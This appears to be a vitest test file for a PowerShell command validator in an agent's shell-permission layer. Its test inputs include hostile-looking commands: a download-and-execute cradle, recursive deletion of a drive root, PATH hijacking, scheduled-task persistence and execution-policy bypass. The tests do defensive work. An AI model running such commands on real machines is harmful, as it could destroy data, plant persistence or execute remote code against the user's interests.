import { describe, expect, it } from 'vitest'
import { BashSecurityCode } from '../bash/bashCodes'
import { validatePowerShellCommand, isPowerShellCommandReadOnly } from './validatePowerShellCommand'

describe('validatePowerShellCommand', () => {
  it('denies Invoke-Expression', () => {
    const a = validatePowerShellCommand('Invoke-Expression "rm *"')
    expect(a.verdict).toBe('deny')
    expect(a.codes).toContain(BashSecurityCode.PS_INVOKE_EXPRESSION)
  })

  it('denies iex alias', () => {
    const a = validatePowerShellCommand('iex (Get-Content script.ps1)')
    expect(a.verdict).toBe('deny')
    expect(a.codes).toContain(BashSecurityCode.PS_INVOKE_EXPRESSION)
  })

  it('denies nested powershell invocation', () => {
    const a = validatePowerShellCommand('powershell -Command "Get-Date"')
    expect(a.verdict).toBe('deny')
    expect(a.codes).toContain(BashSecurityCode.PS_NESTED_PWSH)
  })

  it('denies IWR + IEX cradle pattern', () => {
    const a = validatePowerShellCommand('Invoke-WebRequest http://x | Invoke-Expression')
    expect(a.verdict).toBe('deny')
    expect(a.codes).toContain(BashSecurityCode.PS_DOWNLOAD_IEX)
  })

  it('does not blanket-deny rm (Remove-Item alias) when path is safe', () => {
    const a = validatePowerShellCommand('rm .\\temp.txt', { cwd: process.cwd() })
    expect(a.verdict).not.toBe('deny')
  })

  it('denies dangerous Remove-Item target (drive root on Windows)', () => {
    if (process.platform !== 'win32') {
      return
    }
    const a = validatePowerShellCommand('Remove-Item -Recurse C:\\', { cwd: 'C:\\' })
    expect(a.verdict).toBe('deny')
    expect(a.codes).toContain(BashSecurityCode.PATH_DANGEROUS_TARGET)
  })

  it('marks read-only pipeline for Get-Content', () => {
    const a = validatePowerShellCommand('Get-Content .\\README.md')
    expect(a.verdict).toBe('allow')
    expect(a.isReadOnly).toBe(true)
    expect(isPowerShellCommandReadOnly('Get-Content .\\README.md')).toBe(true)
  })

  it('does not mark git push as read-only', () => {
    const a = validatePowerShellCommand('git push origin main')
    expect(a.isReadOnly).toBe(false)
  })

  // ─── Second wave: 7 LOLBin / persistence / escalation patterns ──────────

  // 1) Invoke-Item / ii
  it('denies Invoke-Item (shell launch / double-click semantics)', () => {
    const a = validatePowerShellCommand('Invoke-Item .\\suspicious.exe')
    expect(a.verdict).toBe('deny')
    expect(a.codes).toContain(BashSecurityCode.PS_INVOKE_ITEM)
  })
  it('denies ii alias at statement start', () => {
    const a = validatePowerShellCommand('ii suspicious.exe')
    expect(a.verdict).toBe('deny')
    expect(a.codes).toContain(BashSecurityCode.PS_INVOKE_ITEM)
  })
  it('does NOT false-match $ii variable or hyphenated cmdlet names', () => {
    // $ii is a variable reference, NOT the ii alias.
    const a = validatePowerShellCommand('$ii = 1; Write-Output $ii')
    expect(a.codes).not.toContain(BashSecurityCode.PS_INVOKE_ITEM)
    // ii-thing would be a different cmdlet name, not the ii alias.
    const b = validatePowerShellCommand('ii-thing-not-real foo')
    expect(b.codes).not.toContain(BashSecurityCode.PS_INVOKE_ITEM)
  })

  // 2) Scheduled task persistence
  it('denies Register-ScheduledTask', () => {
    const a = validatePowerShellCommand('Register-ScheduledTask -TaskName x -Action $a -Trigger $t')
    expect(a.verdict).toBe('deny')
    expect(a.codes).toContain(BashSecurityCode.PS_SCHEDULED_TASK)
  })
  it('denies schtasks.exe utility', () => {
    const a = validatePowerShellCommand('schtasks /Create /TN x /TR notepad /SC ONCE /ST 23:00')
    expect(a.verdict).toBe('deny')
    expect(a.codes).toContain(BashSecurityCode.PS_SCHEDULED_TASK)
  })
  it('does NOT block read-only Get-ScheduledTask', () => {
    const a = validatePowerShellCommand('Get-ScheduledTask')
    expect(a.codes).not.toContain(BashSecurityCode.PS_SCHEDULED_TASK)
  })

  // 3) Set-ExecutionPolicy cmdlet (distinct from -ExecutionPolicy Bypass param)
  it('denies Set-ExecutionPolicy cmdlet (any value, even Unrestricted)', () => {
    const a = validatePowerShellCommand('Set-ExecutionPolicy Unrestricted -Scope CurrentUser')
    expect(a.verdict).toBe('deny')
    expect(a.codes).toContain(BashSecurityCode.PS_SET_EXEC_POLICY)
  })
  it('still denies the existing -ExecutionPolicy Bypass parameter form', () => {
    const a = validatePowerShellCommand('powershell -ExecutionPolicy Bypass -File run.ps1')
    expect(a.verdict).toBe('deny')
    expect(a.codes).toContain(BashSecurityCode.PS_EXEC_POLICY_BYPASS)
  })

  // 4) --% stop-parsing token
  it('denies --% stop-parsing token (everything after becomes opaque)', () => {
    const a = validatePowerShellCommand('cmd --% /c "calc.exe & echo hi"')
    expect(a.verdict).toBe('deny')
    expect(a.codes).toContain(BashSecurityCode.PS_STOP_PARSING)
  })
  it('does NOT false-match `--%` inside a quoted string literal context', () => {
    // Substring "100%" inside a quoted arg should not match `--%`.
    const a = validatePowerShellCommand('Write-Output "progress 100%"')
    expect(a.codes).not.toContain(BashSecurityCode.PS_STOP_PARSING)
  })

  // 5) $env:X = ... assignment
  it('denies $env:PATH assignment (PATH hijack)', () => {
    const a = validatePowerShellCommand('$env:PATH = "C:\\evil;$env:PATH"; npm install')
    expect(a.verdict).toBe('deny')
    expect(a.codes).toContain(BashSecurityCode.PS_ENV_WRITE)
  })
  it('denies $env:VAR += append form', () => {
    const a = validatePowerShellCommand('$env:PATH += ";C:\\evil"')
    expect(a.verdict).toBe('deny')
    expect(a.codes).toContain(BashSecurityCode.PS_ENV_WRITE)
  })
  it('denies ${env:VAR} = ... brace-quoted form', () => {
    const a = validatePowerShellCommand('${env:PATH} = "x"')
    expect(a.verdict).toBe('deny')
    expect(a.codes).toContain(BashSecurityCode.PS_ENV_WRITE)
  })
  it('does NOT false-match $env: read access', () => {
    // Reading env vars is fine.
    const a = validatePowerShellCommand('Write-Output $env:USERPROFILE')
    expect(a.codes).not.toContain(BashSecurityCode.PS_ENV_WRITE)
  })
  it('does NOT false-match $env: -eq comparison', () => {
    const a = validatePowerShellCommand('if ($env:USERNAME -eq "admin") { Write-Output "yes" }')
    expect(a.codes).not.toContain(BashSecurityCode.PS_ENV_WRITE)
  })

  // 6) Dangerous .NET type literal static method
  it('denies [System.IO.File]::WriteAllText (filesystem bypass)', () => {
    const a = validatePowerShellCommand('[System.IO.File]::WriteAllText("C:\\evil.bat", "calc")')
    expect(a.verdict).toBe('deny')
    expect(a.codes).toContain(BashSecurityCode.PS_TYPE_LITERAL_INVOKE)
  })
  it('denies [System.Diagnostics.Process]::Start', () => {
    const a = validatePowerShellCommand('[System.Diagnostics.Process]::Start("calc.exe")')
    expect(a.verdict).toBe('deny')
    expect(a.codes).toContain(BashSecurityCode.PS_TYPE_LITERAL_INVOKE)
  })
  it('denies [IO.File] short form (System. prefix is optional in PS)', () => {
    const a = validatePowerShellCommand('[IO.File]::Delete("x")')
    expect(a.verdict).toBe('deny')
    expect(a.codes).toContain(BashSecurityCode.PS_TYPE_LITERAL_INVOKE)
  })
  it('does NOT false-match benign math/string type literals', () => {
    const a = validatePowerShellCommand('[Math]::Round(3.14159, 2)')
    expect(a.codes).not.toContain(BashSecurityCode.PS_TYPE_LITERAL_INVOKE)
    const b = validatePowerShellCommand('[String]::IsNullOrEmpty($x)')
    expect(b.codes).not.toContain(BashSecurityCode.PS_TYPE_LITERAL_INVOKE)
    const c = validatePowerShellCommand('[DateTime]::UtcNow')
    expect(c.codes).not.toContain(BashSecurityCode.PS_TYPE_LITERAL_INVOKE)
  })

  // 7) Invoke-Command / icm
  it('denies Invoke-Command (arbitrary script block execution)', () => {
    const a = validatePowerShellCommand('Invoke-Command -ScriptBlock { Get-Process; Stop-Process -Force }')
    expect(a.verdict).toBe('deny')
    expect(a.codes).toContain(BashSecurityCode.PS_INVOKE_COMMAND)
  })
  it('denies icm alias at statement start', () => {
    const a = validatePowerShellCommand('icm -ComputerName remote -ScriptBlock { whoami }')
    expect(a.verdict).toBe('deny')
    expect(a.codes).toContain(BashSecurityCode.PS_INVOKE_COMMAND)
  })
  it('does NOT false-match Invoke-Expression (existing PS_INVOKE_EXPRESSION check)', () => {
    const a = validatePowerShellCommand('Invoke-Expression "Get-Date"')
    expect(a.codes).toContain(BashSecurityCode.PS_INVOKE_EXPRESSION)
    // PS_INVOKE_COMMAND must NOT fire on the Invoke-Expression cmdlet.
    expect(a.codes).not.toContain(BashSecurityCode.PS_INVOKE_COMMAND)
  })

  // ─── Left-boundary false-positive guards ────────────────────────────────
  // PS cmdlet names can contain hyphens (e.g., a user-defined function
  // named `My-Invoke-Item`). The bare `\b` form of these regexes would
  // falsely match inside such names because `\b` only checks word↔non-word
  // transition, not cmdlet-name boundary. These guards lock in the
  // `(?<![\w-])` lookbehind tightening.
  it('does NOT match hyphen-prefixed user cmdlet names (Invoke-Item)', () => {
    const a = validatePowerShellCommand('My-Invoke-Item foo')
    expect(a.codes).not.toContain(BashSecurityCode.PS_INVOKE_ITEM)
  })
  it('does NOT match hyphen-prefixed user cmdlet names (Invoke-Command)', () => {
    const a = validatePowerShellCommand('My-Invoke-Command foo')
    expect(a.codes).not.toContain(BashSecurityCode.PS_INVOKE_COMMAND)
  })
  it('does NOT match hyphen-prefixed user cmdlet names (Register-ScheduledTask)', () => {
    const a = validatePowerShellCommand('Helper-Register-ScheduledTask foo')
    expect(a.codes).not.toContain(BashSecurityCode.PS_SCHEDULED_TASK)
  })
  it('does NOT match hyphen-prefixed user cmdlet names (Set-ExecutionPolicy)', () => {
    const a = validatePowerShellCommand('Helper-Set-ExecutionPolicy foo')
    expect(a.codes).not.toContain(BashSecurityCode.PS_SET_EXEC_POLICY)
  })
  it('does NOT match hyphenated extension of schtasks utility', () => {
    // `schtasks-helper.ps1` would be a distinct script name, not the
    // schtasks.exe utility.
    const a = validatePowerShellCommand('.\\schtasks-helper.ps1')
    expect(a.codes).not.toContain(BashSecurityCode.PS_SCHEDULED_TASK)
  })
})
